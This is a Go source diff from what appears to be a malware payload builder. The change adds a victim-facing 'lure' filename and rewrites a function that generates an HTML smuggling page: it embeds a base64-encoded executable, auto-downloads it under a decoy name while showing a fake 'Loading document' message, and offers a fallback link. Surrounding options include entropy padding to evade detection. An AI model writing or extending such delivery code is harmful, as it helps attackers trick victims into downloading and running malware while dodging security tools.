@@ -67,6 +67,8 @@ type BuildConfig struct {
 	TLSSkipVerify bool `json:"tls_skip_verify"`
 	// Output filename (optional, overrides default name)
 	OutputName string `json:"output_name"`
+	// Lure filename shown to the victim (no extension)
+	LureName string `json:"lure_name"`
 	// Entropy reduction: append low-entropy padding to lower overall file entropy
 	EntropyReduce bool `json:"entropy_reduce"`
 
@@ -543,35 +545,57 @@ func findSRDIScript() (string, error) {
 }
 
 // BuildHTML generates an HTML smuggling page that auto-downloads the EXE.
-func BuildHTML(exePath, outDir string) (string, error) {
+// lureName is the filename shown to the victim (without extension).
+func BuildHTML(exePath, outDir, lureName string) (string, error) {
 	data, err := os.ReadFile(exePath)
 	if err != nil {
 		return "", fmt.Errorf("leer exe: %w", err)
 	}
 	encoded := base64.StdEncoding.EncodeToString(data)
-	filename := filepath.Base(exePath)
+	if lureName == "" {
+		lureName = strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(exePath))
+	}
+	dlName := lureName + ".exe"
 
 	html := fmt.Sprintf(`<!DOCTYPE html>
 <html>
 <head><meta charset="utf-8"><title>Loading...</title></head>
 <body>
-<p>Loading document, please wait...</p>
+<p id="msg">Loading document, please wait...</p>
+<a id="dl" style="display:none">Click here to download</a>
 <script>
 (function(){
-var b=atob("%s");
-var n=new Uint8Array(b.length);
-for(var i=0;i<b.length;i++)n[i]=b.charCodeAt(i);
-var blob=new Blob([n],{type:"application/octet-stream"});
-var a=document.createElement("a");
-a.href=URL.createObjectURL(blob);
-a.download="%s";
-document.body.appendChild(a);
-a.click();
-setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(a.href);},10000);
+var fname="%s";
+var b64="%s";
+setTimeout(function(){
+  try{
+    var bin=atob(b64);
+    var n=new Uint8Array(bin.length);
+    for(var i=0;i<bin.length;i++)n[i]=bin.charCodeAt(i);
+    var blob=new Blob([n],{type:"application/octet-stream"});
+    if(window.navigator&&window.navigator.msSaveOrOpenBlob){
+      window.navigator.msSaveOrOpenBlob(blob,fname);
+      document.getElementById("msg").textContent="Document ready. Check your downloads folder.";
+    }else{
+      var url=URL.createObjectURL(blob);
+      var a=document.createElement("a");
+      a.href=url;a.download=fname;
+      document.body.appendChild(a);
+      a.click();
+      document.getElementById("msg").textContent="Document ready. Check your downloads folder.";
+      var dl=document.getElementById("dl");
+      dl.href=url;dl.download=fname;dl.style.display="inline";
+      setTimeout(function(){URL.revokeObjectURL(url);},120000);
+    }
+  }catch(e){
+    document.getElementById("msg").textContent="Error: "+e.message;
+    var dl=document.getElementById("dl");dl.style.display="inline";
+  }
+},50);
 })();
 </script>
 </body>
-</html>`, encoded, filename)
+</html>`, dlName, encoded)
 
 	outPath := filepath.Join(outDir, "delivery.html")
 	if err := os.WriteFile(outPath, []byte(html), 0644); err != nil {
